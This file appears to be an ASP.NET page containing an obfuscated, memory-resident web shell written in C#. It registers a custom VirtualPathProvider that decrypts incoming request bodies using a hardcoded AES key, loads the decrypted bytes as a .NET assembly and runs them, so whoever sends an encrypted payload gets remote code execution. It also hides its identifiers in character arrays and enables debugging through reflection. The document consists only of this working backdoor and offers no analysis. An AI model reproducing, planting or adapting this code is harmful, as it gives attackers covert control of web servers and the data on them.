<%@ Page Language="C#" %> <%@ Import Namespace="System.Diagnostics" %> <%@ Import Namespace="System.IO" %> <%@ Import Namespace="System.Security.Cryptography" %> <%@ Import Namespace="System.Web.Hosting" %> <%@ Import Namespace="System.Reflection" %> <%@ Import Namespace="System.Text" %> <%@ Import Namespace="System.Web" %>  <script runat="server" language="c#"> public void Page_Load() { var aa = typeof(System.Web.Compilation.BuildManager); var ab = aa.GetProperty(new string(new char[] { 'D', 'e', 'b', 'u', 'g', 'g', 'i', 'n', 'g', 'E', 'n', 'a', 'b', 'l', 'e', 'd' }), (BindingFlags)60); if (ab != null) { try { ab.SetValue(null, true); } catch { } } HostingEnvironment.RegisterVirtualPathProvider(new a()); }  public class a : VirtualPathProvider { public override string GetCacheKey(string v) { try { HttpContext ac = HttpContext.Current; if (ac != null && ac.Request.InputStream.Length > 0) { Stream ad = ac.Request.InputStream; ad.Position = 0; byte[] ae = new byte[ad.Length]; ad.Read(ae, 0, ae.Length); byte[] af = Encoding.ASCII.GetBytes(string.Concat("c", "a", "6", "3", "4", "5", "7", "5", "3", "8", "b", "9", "b", "1", "e", "0")); var ag = (SymmetricAlgorithm)CryptoConfig.CreateFromName(new string(new char[] { 'R', 'i', 'j', 'n', 'd', 'a', 'e', 'l' })); ag.KeySize = 128; ag.Key = af; ag.IV = af; ICryptoTransform ah = ag.CreateDecryptor(); byte[] ai; using (MemoryStream aj = new MemoryStream(ae)) using (CryptoStream ak = new CryptoStream(aj, ah, CryptoStreamMode.Read)) using (MemoryStream al = new MemoryStream()) { ak.CopyTo(al); ai = al.ToArray(); } var am = typeof(Assembly); var an = am.GetMethod(new string(new char[] { 'L', 'o', 'a', 'd' }), new Type[] { typeof(byte[]) }); Assembly ao = (Assembly)an.Invoke(null, new object[] { ai }); if (ao != null) { object ap = ao.CreateInstance(new string(new char[] { 'K' })); if (ap != null) ap.Equals(ac); } ac.Response.End(); } } catch { } return Previous.GetCacheKey(v); }  public override bool FileExists(string v) { return v.Contains(new string(new char[] { 'w' })) ? true : Previous.FileExists(v); }  public override VirtualFile GetFile(string v) { return v.Contains(new string(new char[] { 'w' })) ? new b(v) : Previous.GetFile(v); } }  public class b : VirtualFile { public b(string v) : base(v) { } public override Stream Open() { return new MemoryStream(); } } </script>